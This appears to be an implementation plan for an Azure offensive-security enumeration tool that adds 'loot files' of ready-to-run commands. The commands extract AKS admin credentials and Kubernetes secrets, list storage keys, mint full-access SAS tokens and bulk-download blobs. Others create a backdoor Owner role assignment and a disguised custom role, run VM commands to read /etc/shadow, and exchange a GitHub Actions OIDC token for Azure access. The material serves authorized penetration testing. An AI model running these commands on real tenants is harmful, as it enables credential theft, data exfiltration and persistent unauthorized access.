# Azure Loot Files - Implementation TODO

**Focus:** Implement loot files for the 8 modules currently missing them
**Total Tasks:** 8 modules → ~40 loot files to implement
**Timeline:** 3-4 weeks across 2 phases

---

## Phase 1: CRITICAL Modules (Week 1-2) 🔴

###1. aks.go - Azure Kubernetes Service
**Priority:** 🔴 CRITICAL
**Location:** `azure/commands/aks.go`
**Loot Files to Add:** 7

#### Task 1.1: Add LootMap to aks.go

**Implementation:**
```go
LootMap: map[string]*internal.LootFile{
    "aks-kubeconfig":          {Name: "aks-kubeconfig", Contents: ""},
    "aks-credentials":          {Name: "aks-credentials", Contents: ""},
    "aks-identity-tokens":      {Name: "aks-identity-tokens", Contents: ""},
    "aks-pod-exec":             {Name: "aks-pod-exec", Contents: ""},
    "aks-privilege-escalation": {Name: "aks-privilege-escalation", Contents: ""},
    "aks-service-principals":   {Name: "aks-service-principals", Contents: ""},
    "aks-secrets":              {Name: "aks-secrets", Contents: ""},
},
```

#### Task 1.2: Populate loot file contents

**aks-kubeconfig:**
```bash
# Get kubeconfig for cluster
az aks get-credentials --resource-group <rg> --name <cluster> --admin
az aks get-credentials --resource-group <rg> --name <cluster> --overwrite-existing

# Verify access
kubectl cluster-info
kubectl get nodes
```

**aks-credentials:**
```bash
# Extract cluster credentials
az aks show --resource-group <rg> --name <cluster>
az aks show --resource-group <rg> --name <cluster> --query servicePrincipalProfile

# Get admin credentials
az aks get-credentials --resource-group <rg> --name <cluster> --admin --file ~/kubeconfig-<cluster>
export KUBECONFIG=~/kubeconfig-<cluster>
```

**aks-pod-exec:**
```bash
# List all pods
kubectl get pods --all-namespaces -o wide

# Execute commands in pods
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
kubectl exec -it <pod-name> -n <namespace> -- whoami
kubectl exec -it <pod-name> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Extract secrets from pods
kubectl exec -it <pod-name> -n <namespace> -- env | grep -i 'password\|key\|secret\|token'
```

**aks-secrets:**
```bash
# Enumerate all secrets
kubectl get secrets --all-namespaces
kubectl get secrets -n <namespace> -o yaml

# Extract secret values
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}'
kubectl get secret <secret-name> -n <namespace> -o json | jq '.data | map_values(@base64d)'
```

---

### 2. storage.go - Storage Accounts
**Priority:** 🔴 CRITICAL
**Location:** `azure/commands/storage.go`
**Loot Files to Add:** 6

#### Task 2.1: Add LootMap to storage.go

**Implementation:**
```go
LootMap: map[string]*internal.LootFile{
    "storage-keys":              {Name: "storage-keys", Contents: ""},
    "storage-sas-tokens":        {Name: "storage-sas-tokens", Contents: ""},
    "storage-public-blobs":      {Name: "storage-public-blobs", Contents: ""},
    "storage-download-commands": {Name: "storage-download-commands", Contents: ""},
    "storage-mount-commands":    {Name: "storage-mount-commands", Contents: ""},
    "storage-data-exfiltration": {Name: "storage-data-exfiltration", Contents: ""},
},
```

#### Task 2.2: Populate loot file contents

**storage-keys:**
```bash
# List storage account keys
az storage account keys list --account-name <account> --resource-group <rg>

# Get primary key
az storage account keys list --account-name <account> --resource-group <rg> --query '[0].value' -o tsv

# Get connection string
az storage account show-connection-string --name <account> --resource-group <rg>
```

**storage-sas-tokens:**
```bash
# Generate account-level SAS token (full access)
az storage account generate-sas \
  --account-name <account> \
  --services bfqt \
  --resource-types sco \
  --permissions rwdlacup \
  --expiry 2025-12-31T23:59:59Z

# Generate container-level SAS
az storage container generate-sas \
  --account-name <account> \
  --name <container> \
  --permissions rwdl \
  --expiry 2025-12-31T23:59:59Z

# Generate blob SAS
az storage blob generate-sas \
  --account-name <account> \
  --container-name <container> \
  --name <blob> \
  --permissions r \
  --expiry 2025-12-31T23:59:59Z
```

**storage-download-commands:**
```bash
# Download entire container
azcopy copy "https://<account>.blob.core.windows.net/<container>?<sas-token>" "./local-backup" --recursive

# Download specific blob
az storage blob download \
  --account-name <account> \
  --container-name <container> \
  --name <blob> \
  --file ./local-file \
  --account-key <key>

# Download all containers
for container in $(az storage container list --account-name <account> --query '[].name' -o tsv); do
  azcopy copy "https://<account>.blob.core.windows.net/$container?<sas>" "./$container" --recursive
done
```

**storage-mount-commands:**
```bash
# Mount Azure File Share (Linux)
sudo mkdir -p /mnt/azurefiles/<share>
sudo mount -t cifs //<account>.file.core.windows.net/<share> /mnt/azurefiles/<share> \
  -o username=<account>,password=<key>,serverino

# Mount Azure File Share (macOS)
mkdir ~/azurefiles/<share>
mount_smbfs //<account>:<key>@<account>.file.core.windows.net/<share> ~/azurefiles/<share>

# Mount via SMB 3.0
sudo mount -t cifs //<account>.file.core.windows.net/<share> /mnt/<share> \
  -o vers=3.0,username=<account>,password=<key>,dir_mode=0777,file_mode=0777,sec=ntlmssp
```

---

### 3. rbac.go - Role-Based Access Control
**Priority:** 🔴 CRITICAL
**Location:** `azure/commands/rbac.go`
**Loot Files to Add:** 6

#### Task 3.1: Add LootMap to rbac.go

**Implementation:**
```go
LootMap: map[string]*internal.LootFile{
    "rbac-high-privilege":       {Name: "rbac-high-privilege", Contents: ""},
    "rbac-pim-activation":       {Name: "rbac-pim-activation", Contents: ""},
    "rbac-service-principals":   {Name: "rbac-service-principals", Contents: ""},
    "rbac-orphaned":             {Name: "rbac-orphaned", Contents: ""},
    "rbac-persistence":          {Name: "rbac-persistence", Contents: ""},
    "rbac-privilege-escalation": {Name: "rbac-privilege-escalation", Contents: ""},
},
```

#### Task 3.2: Populate loot file contents

**rbac-high-privilege:**
```bash
# Enumerate Owner roles
az role assignment list --role "Owner" --all --query '[].{Principal:principalName, Scope:scope}' -o table

# Enumerate Contributor roles
az role assignment list --role "Contributor" --all --query '[].{Principal:principalName, Scope:scope}' -o table

# Enumerate User Access Administrator
az role assignment list --role "User Access Administrator" --all

# List all high-privilege assignments
for role in "Owner" "Contributor" "User Access Administrator" "Security Admin"; do
  echo "=== $role ==="
  az role assignment list --role "$role" --all
done
```

**rbac-pim-activation:**
```bash
# List eligible role assignments (PIM)
az rest --method GET --url "https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01"

# Activate eligible role
az role assignment create \
  --role "Owner" \
  --assignee <your-object-id> \
  --scope <scope>

# Request PIM activation
az rest --method POST \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests?api-version=2020-10-01" \
  --body '{"properties":{"principalId":"<principal-id>","roleDefinitionId":"<role-def-id>","requestType":"SelfActivate"}}'
```

**rbac-service-principals:**
```bash
# Enumerate service principals with privileged roles
az ad sp list --all --query '[].{Name:displayName, AppId:appId, ObjectId:id}' -o table | while read line; do
  appId=$(echo $line | awk '{print $2}')
  az role assignment list --assignee $appId
done

# Find SPs with Owner role
az role assignment list --role "Owner" --all --query '[?principalType==`ServicePrincipal`].{Name:principalName,Scope:scope}'
```

**rbac-persistence:**
```bash
# Create backdoor role assignment (Owner)
az role assignment create \
  --assignee <attacker-principal-id> \
  --role "Owner" \
  --scope /subscriptions/<subscription-id>

# Create custom role with dangerous permissions
az role definition create --role-definition '{
  "Name": "Custom Maintenance Role",
  "Description": "Maintenance tasks",
  "Actions": [
    "Microsoft.Compute/virtualMachines/runCommand/action",
    "Microsoft.Authorization/roleAssignments/write",
    "Microsoft.KeyVault/vaults/secrets/read"
  ],
  "AssignableScopes": ["/subscriptions/<subscription-id>"]
}'
```

---

### 4. permissions.go - Granular Permissions
**Priority:** 🔴 CRITICAL
**Location:** `azure/commands/permissions.go`
**Loot Files to Add:** 4

#### Task 4.1: Add LootMap to permissions.go

**Implementation:**
```go
LootMap: map[string]*internal.LootFile{
    "permissions-dangerous":      {Name: "permissions-dangerous", Contents: ""},
    "permissions-escalation":     {Name: "permissions-escalation", Contents: ""},
    "permissions-abuse-commands": {Name: "permissions-abuse-commands", Contents: ""},
    "permissions-write-actions":  {Name: "permissions-write-actions", Contents: ""},
},
```

#### Task 4.2: Identify dangerous permissions

**Key Dangerous Actions to Detect:**
- `Microsoft.Compute/virtualMachines/runCommand/action` - Execute commands on VMs
- `Microsoft.Authorization/roleAssignments/write` - Create role assignments
- `Microsoft.KeyVault/vaults/secrets/write` - Write secrets to Key Vault
- `Microsoft.KeyVault/vaults/secrets/read` - Read secrets from Key Vault
- `Microsoft.Storage/storageAccounts/listKeys/action` - List storage account keys
- `Microsoft.Web/sites/config/list/action` - List web app configuration
- `Microsoft.Compute/disks/write` - Create disk snapshots
- `Microsoft.Compute/snapshots/write` - Create snapshots

#### Task 4.3: Populate loot file contents

**permissions-abuse-commands:**
```bash
# VM runCommand abuse
az vm run-command invoke \
  --resource-group <rg> \
  --name <vm> \
  --command-id RunShellScript \
  --scripts "cat /etc/shadow; find / -name '*.key' 2>/dev/null"

# List storage account keys
az storage account keys list --account-name <account> --resource-group <rg>

# Read Key Vault secrets
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# Create role assignment for persistence
az role assignment create \
  --assignee <principal-id> \
  --role "Contributor" \
  --scope <scope>
```

---

## Phase 2: HIGH Priority Modules (Week 3) 🟡

### 5. federated-credentials.go - Federated Identity Credentials
**Priority:** 🟡 HIGH
**Location:** `azure/commands/federated-credentials.go`
**Loot Files to Add:** 4

#### Task 5.1: Add LootMap

```go
LootMap: map[string]*internal.LootFile{
    "fedcred-github-actions":   {Name: "fedcred-github-actions", Contents: ""},
    "fedcred-oidc-issuers":     {Name: "fedcred-oidc-issuers", Contents: ""},
    "fedcred-exploitation":     {Name: "fedcred-exploitation", Contents: ""},
    "fedcred-workload-identity": {Name: "fedcred-workload-identity", Contents: ""},
},
```

#### Task 5.2: GitHub Actions exploitation

**fedcred-github-actions:**
```yaml
# GitHub Actions workflow to obtain Azure token
name: Azure Token Extraction
on: [push]
jobs:
  extract:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - name: Get Azure token
        run: |
          TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
          az login --service-principal -u <app-id> -t <tenant-id> --federated-token $TOKEN
          az account list
```

---

### 6. consent-grants.go - OAuth Consent Grants
**Priority:** 🟡 HIGH
**Location:** `azure/commands/consent-grants.go`
**Loot Files to Add:** 4

#### Task 6.1: Add LootMap

```go
LootMap: map[string]*internal.LootFile{
    "consent-overprivileged":   {Name: "consent-overprivileged", Contents: ""},
    "consent-tenant-wide":      {Name: "consent-tenant-wide", Contents: ""},
    "consent-risky-permissions": {Name: "consent-risky-permissions", Contents: ""},
    "consent-abuse-commands":   {Name: "consent-abuse-commands", Contents: ""},
},
```

#### Task 6.2: Identify risky permissions

**High-Risk Delegated Permissions:**
- `Mail.Read` / `Mail.ReadWrite` - Email access
- `Files.ReadWrite.All` - Full file access
- `Calendars.ReadWrite` - Calendar access
- `User.Read.All` - Read all user profiles
- `Directory.AccessAsUser.All` - Access directory as signed-in user

**High-Risk Application Permissions:**
- `Mail.ReadWrite` - Read/write all mailboxes
- `Files.ReadWrite.All` - Read/write all files
- `User.ReadWrite.All` - Read/write all users

---

### 7. devops-agents.go - Azure DevOps Agents
**Priority:** 🟡 MEDIUM
**Location:** `azure/commands/devops-agents.go`
**Loot Files to Add:** 5

#### Task 7.1: Add LootMap

```go
LootMap: map[string]*internal.LootFile{
    "devops-agents-self-hosted": {Name: "devops-agents-self-hosted", Contents: ""},
    "devops-agents-capabilities": {Name: "devops-agents-capabilities", Contents: ""},
    "devops-agents-tokens":       {Name: "devops-agents-tokens", Contents: ""},
    "devops-agents-pools":        {Name: "devops-agents-pools", Contents: ""},
    "devops-agents-registration": {Name: "devops-agents-registration", Contents: ""},
},
```

---

### 8. conditional-access.go - Conditional Access Policies
**Priority:** 🟡 MEDIUM
**Location:** `azure/commands/conditional-access.go`
**Loot Files to Add:** 5

#### Task 8.1: Add LootMap

```go
LootMap: map[string]*internal.LootFile{
    "ca-bypass-opportunities": {Name: "ca-bypass-opportunities", Contents: ""},
    "ca-excluded-principals":  {Name: "ca-excluded-principals", Contents: ""},
    "ca-legacy-auth":          {Name: "ca-legacy-auth", Contents: ""},
    "ca-report-only":          {Name: "ca-report-only", Contents: ""},
    "ca-mfa-gaps":             {Name: "ca-mfa-gaps", Contents: ""},
},
```

---

## Implementation Checklist

### For Each Module:

- [ ] **Step 1:** Add `LootMap` field to module struct
- [ ] **Step 2:** Initialize LootMap in module initialization
- [ ] **Step 3:** Populate loot file Contents during enumeration
- [ ] **Step 4:** Build loot array from non-empty loot files
- [ ] **Step 5:** Pass loot files to output writer
- [ ] **Step 6:** Test with sample data
- [ ] **Step 7:** Verify loot files created correctly
- [ ] **Step 8:** Validate command syntax

### Testing Per Module:

- [ ] Test with valid data (should create loot files)
- [ ] Test with empty data (should NOT create loot files)
- [ ] Test loot file directory creation
- [ ] Test loot file content format
- [ ] Verify commands are copy-paste ready
- [ ] Test with multiple subscriptions/tenants
- [ ] Verify no sensitive data leakage in non-loot outputs

---

## Code Pattern to Follow

Based on existing modules (e.g., `accesskeys.go`, `keyvaults.go`):

```go
// 1. Add LootMap to module struct
type ModuleData struct {
    // ... existing fields
    LootMap map[string]*internal.LootFile
}

// 2. Initialize LootMap
m := ModuleData{
    // ... existing initialization
    LootMap: map[string]*internal.LootFile{
        "module-loot-1": {Name: "module-loot-1", Contents: ""},
        "module-loot-2": {Name: "module-loot-2", Contents: ""},
    },
}

// 3. Populate loot files during enumeration
if conditionMet {
    commands := generateCommands(resourceData)
    m.LootMap["module-loot-1"].Contents += commands
}

// 4. Build loot array at end
loot := []internal.LootFile{}
for _, lf := range m.LootMap {
    if lf.Contents != "" {
        loot = append(loot, *lf)
    }
}

// 5. Write output with loot files
o.WriteFullOutput(m.TableFiles, loot)
```

---

## Success Metrics

### Phase 1 Completion:
- [ ] 4 modules have loot files implemented
- [ ] ~23 new loot files created
- [ ] Kubernetes credential extraction working
- [ ] Storage key extraction working
- [ ] High-privilege RBAC enumeration working
- [ ] Dangerous permission identification working

### Phase 2 Completion:
- [ ] All 8 modules have loot files implemented
- [ ] ~40 new loot files created
- [ ] 100% module coverage achieved
- [ ] Identity & Access category at 100% coverage

### Quality Metrics:
- [ ] All loot files contain actionable commands
- [ ] No empty loot files created
- [ ] Commands are syntactically correct
- [ ] Dynamic values properly substituted
- [ ] Tests passing for all new implementations

---

## Timeline

| Week | Focus | Modules | Loot Files |
|------|-------|---------|------------|
| Week 1 | aks.go, storage.go | 2 | ~13 |
| Week 2 | rbac.go, permissions.go | 2 | ~10 |
| Week 3 | federated-credentials, consent-grants, devops-agents, conditional-access | 4 | ~18 |

**Total:** 3 weeks, 8 modules, ~40 loot files

---

**Ready for Implementation - Awaiting Approval**
